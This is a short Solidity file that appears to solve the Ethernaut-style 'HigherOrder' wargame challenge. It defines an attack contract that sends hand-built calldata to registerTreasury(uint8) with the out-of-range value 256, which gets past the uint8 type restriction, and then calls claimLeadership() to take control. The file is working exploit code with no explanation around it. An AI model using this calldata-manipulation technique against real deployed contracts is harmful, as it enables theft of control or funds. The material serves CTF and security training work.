// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

contract HigherOrderAttack is Broadcasted {
    function attack(address payable hightOrderCtr_) public payable override {
        uint256 _integer = 256;

        bytes memory _funcSelector = abi.encodeWithSignature(
            "registerTreasury(uint8)"
        );

        bytes memory _data = abi.encodePacked(_funcSelector, _integer);

        address(hightOrderCtr_).call(_data);

        IHigherOrder(hightOrderCtr_).claimLeadership();
    }
}

interface IHigherOrder {
    function treasury() external returns (uint256);

    function claimLeadership() external;
}
